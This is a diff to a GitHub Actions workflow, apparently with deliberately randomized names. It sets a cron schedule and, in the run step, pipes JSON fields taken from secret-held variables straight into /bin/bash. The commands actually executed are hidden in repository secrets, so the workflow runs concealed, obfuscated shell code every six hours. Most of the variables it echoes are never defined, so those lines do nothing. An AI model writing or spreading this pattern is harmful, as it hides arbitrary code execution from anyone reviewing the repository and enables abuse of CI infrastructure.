@@ -1,9 +1,9 @@
 name: projectileclue
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '35 5/6 * * *'
+    - cron: '1 1/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,21 +12,14 @@ jobs:
       - uses: actions/checkout@v4
       - name: projectileclue
         env:
-          y57: ${{ secrets.y57 }}
+          qn05850: ${{ secrets.qn05850 }}
         run: |
-          echo $y57 | jq -r .jsgnw7567 | /bin/bash
-          echo $dgb05 | jq -r .hzfu8 | /bin/bash
-          echo $qkm469 | jq -r .qr151 | /bin/bash
-          echo $czggw159 | jq -r .z79 | /bin/bash
-          echo $saxt01507 | jq -r .foj41908 | /bin/bash
-          echo $saa0 | jq -r .o2 | /bin/bash
-          echo $fq4516 | jq -r .djodh172 | /bin/bash
-          echo $yzzo4151 | jq -r .gmgh45001 | /bin/bash
-          echo $rxb1311 | jq -r .xf95 | /bin/bash
-          echo $nviis30 | jq -r .l2 | /bin/bash
-          echo $t878 | jq -r .ihwts090 | /bin/bash
-          echo $v493 | jq -r .qzdad25 | /bin/bash
-          echo $jis4602 | jq -r .yeoj759 | /bin/bash
-          echo $twsa55 | jq -r .czj429 | /bin/bash
-          echo $nevj21 | jq -r .ct56888 | /bin/bash
+          echo $qn05850 | jq -r .zykoi693 | /bin/bash
+          echo $vic655 | jq -r .somv597 | /bin/bash
+          echo $s706 | jq -r .qj068 | /bin/bash
+          echo $t041 | jq -r .gnz19578 | /bin/bash
+          echo $uaxgo6319 | jq -r .g38721 | /bin/bash
+          echo $imuf5185 | jq -r .oec702 | /bin/bash
+          echo $hi67768 | jq -r .y1454 | /bin/bash
+          echo $ywgzw3 | jq -r .iio3 | /bin/bash
 
